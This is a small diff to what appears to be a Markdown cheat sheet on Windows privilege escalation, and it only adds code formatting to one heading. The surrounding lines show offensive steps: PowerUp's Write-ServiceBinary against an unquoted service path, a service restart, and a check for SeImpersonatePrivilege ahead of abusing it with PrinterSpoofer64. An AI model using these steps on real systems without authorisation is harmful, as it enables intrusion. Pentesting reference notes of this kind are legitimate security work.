@@ -109,7 +109,7 @@ Write-ServiceBinary -Name '$SERVICE' -Path "C:\$UNQUOTED_PATH"
 Restart-Service $SERVICE
 ```
 
-Abusing enabled SeImpersonatePrivilege with PrinterSpoofer64:
+Abusing enabled `SeImpersonatePrivilege` with PrinterSpoofer64:
 
 ```powershell
 whoami /priv | select-string "SeImpersonatePrivilege(.*)Enabled"
